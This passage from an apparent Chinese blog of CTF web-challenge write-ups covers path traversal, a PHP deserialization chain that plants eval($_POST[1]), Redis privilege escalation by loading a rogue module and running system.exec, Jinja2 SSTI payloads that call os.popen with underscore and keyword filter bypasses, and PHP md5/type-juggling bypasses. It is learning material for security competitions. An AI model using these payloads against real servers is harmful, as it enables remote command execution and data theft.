src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*payload:</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">?file=hint.php?../../../../../../ffffllllaaaagggg</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">file=hint.php%3f../../../../../../ffffllllaaaagggg  %3f是?的url编码</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"17天翼杯-2021esay_evalredis\"><a class=\"markdownIt-Anchor\" href=\"#17天翼杯-2021esay_evalredis\">#</a> 17.[天翼杯 2021] esay_eval–REDIS]</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">a</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$code</span> = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;code=<span class=\"string\">&quot;eval(\\$_POST[1]);&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">b</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;a=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">A</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">b</span>());</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>这题链子不难找，绕过 wakeup 的正则表达式绕过用大小写绕过<br>\n学习一个新知识:redis 提权<br>\n！[[Pasted image 20230502170947.png]]<br>\n antsword 连接上去后发现不能访问其他目录，发现一个 config.php.swp 内容有 redis 密码<br>\n蚁剑 Redis 插件地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://github.com/Medicean/AS_Redis</span><br></pre></td></tr></table></figure>\n<p>git clone 到 antData/plugins 下<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1leHAtcDE4ZHZiMmw0OWQuc28=\">上传一个 exp.so</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">文件地址：https://github.com/Dliv3/redis-rogue-server</span><br></pre></td></tr></table></figure>\n<p>蚁剑连上插件后添加数据密码填文件里的<br>\n直接执行命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MODULE LOAD /var/www/html/exp.so</span><br><span class=\"line\">system.exec &quot;命令&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"18安洵杯-2020normal-ssti\"><a class=\"markdownIt-Anchor\" href=\"#18安洵杯-2020normal-ssti\">#</a> 18.[安洵杯 2020] Normal SSTI</h3>\n<p>此题考点 unicode 编码绕过，ssti 过滤<br>\n先测试一下发现过滤了 <code>&#123;&#123;&#125;&#125;,空格,点号</code> <br>\n先找一个通用 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;%print(lipsum.__globals__.__getitem__(&quot;os&quot;).popen(&quot;cat flag&quot;).read())%&#125;</span><br></pre></td></tr></table></figure>\n<p>点号可以用 attr 绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)())%&#125;</span><br></pre></td></tr></table></figure>\n<p>但是此题还过滤了下划线，这里解锁一种新的绕过方法：Unicode 编码绕过<br>\n先用 gpt 写一段脚本:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 定义一个空列表，用于存储每个字符的Unicode编码  </span></span><br><span class=\"line\">unicode_lst = []  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\"># 输入需要转换的字符串  </span></span><br><span class=\"line\">input_str = <span class=\"built_in\">input</span>(<span class=\"string\">&quot;请输入要转换的字符串：&quot;</span>)  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\"># 遍历输入字符串，并将每个字符的Unicode编码按照 \\uXXXX 的形式存储到unicode_lst列表中  </span></span><br><span class=\"line\"><span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> input_str:  </span><br><span class=\"line\">unicode_lst.append(<span class=\"string\">&quot;\\\\u%04x&quot;</span> % <span class=\"built_in\">ord</span>(char))  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\"># 打印转换结果  </span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;转换结果：&quot;</span>, <span class=\"string\">&quot;&quot;</span>.join(unicode_lst))</span><br></pre></td></tr></table></figure>\n<p>需要什么自己转换就行了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__globals__:\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f</span><br><span class=\"line\">__getitem__:\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f</span><br><span class=\"line\">注意哦这里还过滤了一些关键字:popen,flag</span><br><span class=\"line\">popen:\\u0070\\u006f\\u0070\\u0065\\u006e</span><br><span class=\"line\">空格:\\u0020</span><br><span class=\"line\">flag:\\u0066\\u006c\\u0061\\u0067</span><br></pre></td></tr></table></figure>\n<p>合在一起:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;%print(lipsum|attr(&quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f&quot;)(&quot;os&quot;)|attr(&quot;\\u0070\\u006f\\u0070\\u0065\\u006e&quot;)(&quot;cat\\u0020/\\u0066\\u006c\\u0061\\u0067&quot;)|attr(&quot;read&quot;)())%&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"19hnctf-2022-week3ssssti\"><a class=\"markdownIt-Anchor\" href=\"#19hnctf-2022-week3ssssti\">#</a> 19.[HNCTF 2022 WEEK3]ssssti</h3>\n<p>测试一些？name=…<br>\n 发现过滤单双引号，下划线</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;lipsum.__globals__.get(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;config[request.values.a][request.values.b][request.values.c][request.values.d].popen(request.values.e).read() &#125;&#125;&amp;a=__class__&amp;b=__init__&amp;c=__globals__&amp;d=os&amp;e=ls</span><br></pre></td></tr></table></figure>\n<h3 id=\"20gdouctf-2023ez_ze\"><a class=\"markdownIt-Anchor\" href=\"#20gdouctf-2023ez_ze\">#</a> 20.[GDOUCTF 2023]&lt;ez_ze&gt;</h3>\n<p>测试发现过滤了 <code>&#123;&#123;&#125;&#125;,点号,下划线,双引号(单引号没有过滤),[],关键字getitem,os,popen(注意这里的set)</code> <br>\n 这里我们来试试 set 方法绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">常用payload:</span><br><span class=\"line\">&#123;%print(lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(&#x27;ls /&#x27;)|attr(&#x27;read&#x27;)())%&#125;</span><br></pre></td></tr></table></figure>\n<p>开干:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查看下划线的位置18和24</span><br><span class=\"line\">&#123;%print(lipsum|string|list)%&#125;</span><br><span class=\"line\">构建pop字符串</span><br><span class=\"line\">&#123;%set pop=dict(pop=a)|join%&#125;</span><br><span class=\"line\">&#123;%set xhx=(lipsum|string|list)|attr(pop)(18)%&#125;</span><br><span class=\"line\">&#123;%set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join()%&#125;</span><br><span class=\"line\">&#123;%set geti=(xhx,xhx,dict(get=a)|join,dict(item=a)|join,xhx,xhx)|join%&#125;</span><br><span class=\"line\">&#123;%set oo=(dict(o=a)|join,dict(s=a)|join)|join%&#125;</span><br><span class=\"line\">&#123;%set poe=(dict(pop=a)|join,dict(en=a)|join)|join%&#125;</span><br><span class=\"line\">&#123;%print(lipsum|attr(globals)|attr(geti)(oo)|attr(poe)(&#x27;ls /&#x27;)|attr(&#x27;read&#x27;)())%&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">再改一下命令为cat /flag就行</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"21gdouctf-2023受不了一点\"><a class=\"markdownIt-Anchor\" href=\"#21gdouctf-2023受不了一点\">#</a> 21.[GDOUCTF 2023] 受不了一点</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;gdou&#x27;</span>]) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;ctf&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$b</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;ctf&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;gdou&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;gdou&#x27;</span>] != <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;ctf&#x27;</span>] &amp;&amp; <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$a</span>) === <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$b</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;cookie&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;cookie&#x27;</span>] == <span class=\"string\">&#x27;j0k3r&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;aaa&#x27;</span>]) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;bbb&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"variable\">$aaa</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;aaa&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"variable\">$bbb</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;bbb&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (<span class=\"variable\">$aaa</span> == <span class=\"number\">114514</span> &amp;&amp; <span class=\"variable\">$bbb</span> == <span class=\"number\">114514</span> &amp;&amp; <span class=\"variable\">$aaa</span> != <span class=\"variable\">$bbb</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"variable\">$give</span> = <span class=\"string\">&#x27;cancanwordflag&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"variable\">$get</span> = <span class=\"string\">&#x27;hacker!&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;flag&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"keyword\">die</span>(<span class=\"variable\">$give</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;flag&#x27;</span>] === <span class=\"string\">&#x27;flag&#x27;</span> || <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;flag&#x27;</span>] === <span class=\"string\">&#x27;flag&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"keyword\">die</span>(<span class=\"variable\">$get</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"keyword\">foreach</span> (<span class=\"variable\">$_POST</span> <span class=\"keyword\">as</span> <span class=\"variable\">$key</span> =&gt; <span class=\"variable\">$value</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"variable\">$$key</span> = <span class=\"variable\">$value</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"keyword\">foreach</span> (<span class=\"variable\">$_GET</span> <span class=\"keyword\">as</span> <span class=\"variable\">$key</span> =&gt; <span class=\"variable\">$value</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"variable\">$$key</span> = <span class=\"variable\">$$value</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;洗洗睡吧&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;行不行啊细狗&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;菜菜&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;就这?&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;别来沾边&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>第一个 md5 强比较直接数组绕过<br>\n加个 cookie: <code>cookie=j0k3r</code> <br>\n 传个 aaa 和 bbb, 其中一个在最后加个字母即可， <code>==</code>  弱比较会进行类型转换<br>\n最后有个 foreach 遍历会覆盖 flag 变量的值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get:</span><br><span class=\"line\">?aaa=114514a&amp;bbb=114514&amp;1=flag&amp;flag=1</span><br><span class=\"line\">先将$1=$flag,再将$flag=$1</span><br><span class=\"line\">post:</span><br><span class=\"line\">gdou[]=1&amp;ctf[]=2</span><br></pre></td></tr></table></figure>\n<h3 id=\"22gdouctf-2023反方向的钟\"><a class=\"markdownIt-Anchor\" href=\"#22gdouctf-2023反方向的钟\">#</a> 22.[GDOUCTF 2023] 反方向的钟</h3>\n<p>此题考到 php 的内置类 SplFileObject</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// flag.php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">teacher</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$rank</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$salary</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$rank</span>, <span class=\"variable\">$salary</span> = <span class=\"number\">10000</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;rank = <span class=\"variable\">$rank</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;salary = <span class=\"variable\">$salary</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">classroom</span></span></span><br><span class=\"line\"><span 